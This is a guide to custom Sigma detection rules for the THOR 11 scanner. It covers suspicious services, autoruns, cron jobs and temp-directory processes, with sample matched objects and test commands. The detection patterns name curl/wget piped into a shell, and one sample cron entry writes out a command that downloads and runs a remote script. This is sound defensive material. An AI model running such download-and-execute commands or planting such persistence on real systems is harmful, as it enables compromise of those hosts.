# THOR 11 object-based Sigma rules (tested)

THOR 11 only. Place each rule in `custom-signatures/sigma/<name>.yml` (`.yml`, not `.yaml`). Every rule below was
compiled with the Sigma engine THOR 11 uses and matched against an event built the way THOR builds it
(`product` = scanned OS, `service: THOR`, `category` = object type, fields = JSON names joined with dots); the
negative cases (old `product: THOR` form, UPPERCASE fields, wrong OS) did not match.

All use `level: high` so they load under the default `--sigma-threshold high`. Rule 4 adds `score: 75`, which sets the
score directly and loads the rule regardless of the threshold.

## 1. Service installed from a user-writable folder (`Windows service`)

Produced by module `ServiceCheck`.

```yaml
title: Windows Service Binary in User-Writable Folder
id: 6f2d1c1e-4b7a-4d8e-9a51-0c3f2b7e9a01
status: experimental
description: Detects a Windows service whose binary resides in a user-writable or temporary folder
author: Your Name
date: 2026-11-16
tags:
    - attack.persistence
    - attack.t1543.003
logsource:
    service: THOR
    category: Windows service
    product: windows
detection:
    selection:
        image.path|contains:
            - '\Users\Public\'
            - '\AppData\'
            - '\Windows\Temp\'
            - '\ProgramData\'
    filter_known:
        image.path|contains: '\ProgramData\Microsoft\Windows Defender\'
    condition: selection and not filter_known
falsepositives:
    - Software that installs services from ProgramData
level: high
```
Matching object (as logged with `--log-object "Windows service" --console-json`, shortened):
`{"type":"Windows service","service_name":"upd","start_type":"AUTO_START","command":"C:\\Users\\Public\\upd.exe -k","image":{"path":"C:\\Users\\Public\\upd.exe"}}`

## 2. Autorun launching a script host from a user folder (`autorun entry`)

Produced by module `Autoruns`.

```yaml
title: Autorun Entry Launching Script Host from User Folder
id: 0b9d7c52-1f3e-4f7a-8f0e-5a2e6c1d4b02
status: experimental
description: Detects autorun entries that start a script host or encoded PowerShell from a user-writable folder
author: Your Name
date: 2026-11-16
tags:
    - attack.persistence
    - attack.t1547.001
logsource:
    service: THOR
    category: autorun entry
    product: windows
detection:
    selection_location:
        launch_string|contains:
            - '\AppData\'
            - '\Users\Public\'
            - '\Temp\'
    selection_launcher:
        launch_string|contains:
            - 'powershell'
            - 'mshta'
            - 'wscript'
            - 'cscript'
            - 'rundll32'
            - '.vbs'
            - '.hta'
    condition: selection_location and selection_launcher
falsepositives:
    - Per-user software updaters
level: high
```
Matching object: `{"type":"autorun entry","autorun_type":"Logon","location":"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","entry":"Updater","launch_string":"wscript.exe C:\\Users\\bob\\AppData\\Roaming\\upd.vbs"}`

## 3. Cron job that pipes a download into a shell (`cron job`)

Produced by module `Cron` (Linux). No `product`, so it also applies when scanning other Unix targets.

```yaml
title: Cron Job Downloading and Executing a Script
id: 3c4e8a71-9d2b-4c6f-b1e0-7f5a2d9c3e03
status: experimental
description: Detects cron jobs that pipe downloaded content into a shell
author: Your Name
date: 2026-11-16
tags:
    - attack.persistence
    - attack.t1053.003
logsource:
    service: THOR
    category: cron job
detection:
    selection_download:
        command|contains:
            - 'curl '
            - 'wget '
    selection_exec:
        command|contains:
            - '|sh'
            - '| sh'
            - '|bash'
            - '| bash'
    condition: selection_download and selection_exec
falsepositives:
    - Installer or update scripts run by cron
level: high
```
Matching object: `{"type":"cron job","user":"root","schedule":"*/5 * * * *","command":"curl -fsSL http://203.0.113.5/x.sh | sh"}`

## 4. Process running from a temporary directory (`process`)

Produced by module `ProcessCheck`. `product: linux` limits it to Linux hosts.

```yaml
title: Process Running from Temporary Directory
id: 9a1f5e2d-6b3c-4e8a-a7d4-2c9e0f1b5d04
status: experimental
description: Detects running processes whose executable lives in a world-writable temporary directory
author: Your Name
date: 2026-11-16
tags:
    - attack.execution
    - attack.defense-evasion
logsource:
    service: THOR
    category: process
    product: linux
detection:
    selection:
        image.path|startswith:
            - '/tmp/'
            - '/var/tmp/'
            - '/dev/shm/'
    condition: selection
falsepositives:
    - Installers and build jobs executing from /tmp
level: high
score: 75
```
Matching object: `{"type":"process","pid":4242,"name":"kworkerd","command":"/dev/shm/.x/kworkerd -c /dev/shm/.x/c.json","owner":"www-data","image":{"path":"/dev/shm/.x/kworkerd"},"parent_info":{"pid":1,"exe":"/usr/lib/systemd/systemd"}}`

## Variations

- Scheduled tasks (`category: scheduled task`): the command list is an array, use `commands.0.command`,
  `commands.0.image.path` (add `commands.1.command` … for multi-action tasks).
- systemd units (`category: systemd service`): `command`, `run_as_user`, `unit.path`, `image.path`.
- Hash match on executed files (`category: AmCache entry`): `sha1`, `file.path`.
- Missing field: `field: null`; empty field: `field: ''`.

## What does **not** work

```yaml
logsource:            # pre-release form: loads, never matches
    product: THOR
    service: Windows service
detection:
    selection:
        IMAGE|contains: '\Temp\'     # text-log key: never matches, use image.path
```

## Test

```bash
cp svc-userfolder.yml /opt/thor/custom-signatures/sigma/
./thor-linux-64 --list-signatures | grep -i "User-Writable"          # loaded?
# Windows, run only the producing module, no ThorDB, own output dir
thor64.exe --custom-signatures-only --module ServiceCheck --no-thordb -e C:\thor-test
# See real field values for writing rules
thor64.exe --module ServiceCheck --log-object "Windows service:5" --console-json --no-thordb -e C:\thor-test
```
Filter license data when showing console output: `grep -v -e LICENSE_OWNER -e 'License file found' -e 'Scan Information'`
(PowerShell: `Select-String -NotMatch 'LICENSE_OWNER|License file found|Scan Information'`).
